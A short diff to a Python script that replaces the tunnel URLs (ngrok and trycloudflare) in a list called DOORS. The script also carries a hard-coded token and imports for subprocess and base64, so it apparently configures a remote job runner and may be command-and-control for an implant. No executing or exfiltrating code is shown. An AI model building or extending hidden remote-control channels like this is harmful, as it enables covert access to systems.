@@ -6,8 +6,8 @@ import os, sys, json, time, base64, subprocess, urllib.request, hashlib
 
 TOK = "GOLD24"
 DOORS = [
-    "https://retrain-schnapps-upbeat.ngrok-free.dev",
-    "https://phantom-analytical-gains-curious.trycloudflare.com",
+    "https://adjacent-award-replies-chronicles.trycloudflare.com",
+    "https://federal-consultation-sponsor-enormous.trycloudflare.com",
 ]
 HDRS = {"User-Agent": "kilo-job", "ngrok-skip-browser-warning": "1"}
 
